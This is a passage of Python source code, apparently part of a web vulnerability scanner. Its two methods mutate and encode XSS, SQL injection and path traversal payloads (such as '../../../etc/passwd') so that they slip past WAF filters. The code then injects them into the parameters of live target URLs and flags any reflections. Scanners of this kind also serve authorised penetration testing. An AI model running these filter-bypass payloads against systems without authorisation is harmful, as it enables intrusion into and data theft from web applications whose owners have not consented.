    def test_payload_permutation_matrix(self):
        """Payload Permutation — generate all character permutations to bypass WAF."""
        if not self.deep: return
        self._print("[*]", "Payload Permutation Matrix (supernova)...", "INFO")
        # Base payloads to permute
        base_payloads = [
            "<script>alert(1)</script>",
            "' OR 1=1--",
            "../../../etc/passwd",
        ]
        # Permutation techniques
        permutations = [
            # Character swap
            ("swap", lambda p: p[:len(p)//2][::-1] + p[len(p)//2:]),
            # Character duplicate
            ("dup", lambda p: "".join(c+c for c in p)),
            # Insert random chars
            ("insert", lambda p: "".join(c + random.choice(string.ascii_lowercase) for c in p)),
            # Reverse
            ("reverse", lambda p: p[::-1]),
            # Rotate
            ("rotate", lambda p: p[1:] + p[0]),
            # Uppercase first
            ("ucfirst", lambda p: p[0].upper() + p[1:]),
            # Add null bytes between chars
            ("nulls", lambda p: "".join(c + "\x00" for c in p)),
            # URL-encode each char
            ("urlenc", lambda p: "".join(f"%{ord(c):02x}" for c in p)),
            # HTML-entity encode
            ("htmlenc", lambda p: "".join(f"&#{ord(c)};" for c in p)),
            # Unicode escape
            ("unienc", lambda p: "".join(f"\\u{ord(c):04x}" for c in p)),
        ]
        tested = set()
        for url, params in list(self.params_seen)[:3]:
            for p in params:
                if (url, p) in tested: continue
                tested.add((url, p))
                for base in base_payloads:
                    for label, mutator in permutations:
                        try:
                            permuted = mutator(base)
                            marker = "perm" + "".join(random.choices(string.ascii_lowercase, k=5))
                            test_url = self._inject(url, p, marker + permuted)
                            r = self._get(test_url)
                            if r and marker in (r.text or ""):
                                # Check if any dangerous pattern is reflected
                                if any(kw in r.text for kw in ["alert", "root:", "passwd", "OR 1=1"]):
                                    self._add_vuln(
                                        f"Payload Permutation bypass: {label}",
                                        "HIGH", test_url,
                                        f"base={base[:20]} permutation={label}",
                                        param=p, permutation=label, base_payload=base[:20])
                        except Exception:
                            pass

    def test_encoding_cascade(self):
        """Encoding Cascade — try 20+ encoding combinations."""
        if not self.deep: return
        self._print("[*]", "Encoding Cascade (supernova)...", "INFO")
        base_payload = "<script>alert(1)</script>"
        encodings = [
            ("url_single", urllib.parse.quote(base_payload)),
            ("url_double", urllib.parse.quote(urllib.parse.quote(base_payload))),
            ("url_triple", urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(base_payload)))),
            ("html_entity", "".join(f"&#{ord(c)};" for c in base_payload)),
            ("html_hex", "".join(f"&#x{ord(c):02x};" for c in base_payload)),
            ("hex", "".join(f"\\x{ord(c):02x}" for c in base_payload)),
            ("unicode", "".join(f"\\u{ord(c):04x}" for c in base_payload)),
            ("base64", base64.b64encode(base_payload.encode()).decode()),
            ("base64url", base64.urlsafe_b64encode(base_payload.encode()).decode()),
            ("rot13", base_payload.translate(str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))),
            ("reverse", base_payload[::-1]),
            ("lower", base_payload.lower()),
            ("upper", base_payload.upper()),
            ("mixed", "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(base_payload))),
            ("url+html", urllib.parse.quote("".join(f"&#{ord(c)};" for c in base_payload))),
            ("html+base64", "".join(f"&#{ord(c)};" for c in base64.b64encode(base_payload.encode()).decode())),
            ("url+base64", urllib.parse.quote(base64.b64encode(base_payload.encode()).decode())),
            ("null_prefix", "\x00" + base_payload),
            ("null_suffix", base_payload + "\x00"),
            ("null_middle", base_payload[:len(base_payload)//2] + "\x00" + base_payload[len(base_payload)//2:]),
            ("tab_separated", base_payload.replace(" ", "\t")),
            ("newline_separated", base_payload.replace(" ", "\n")),
            ("comment_injected", base_payload.replace("<", "<!--")),
        ]
        tested = set()
        for url, params in list(self.params_seen)[:5]:
            for p in params:
                if (url, p) in tested: continue
                tested.add((url, p))
                for label, encoded in encodings:
                    marker = "enc" + "".join(random.choices(string.ascii_lowercase, k=5))
                    test_url = self._inject(url, p, marker + encoded)
                    r = self._get(test_url)
                    if r and marker in (r.text or ""):
                        if "alert(1)" in r.text or "alert" in r.text.lower():
                            self._add_vuln(f"Encoding Cascade bypass: {label}",
                                            "HIGH", test_url,
                                            f"encoding={label} bypassed WAF/filter",
                                            param=p, encoding=label)

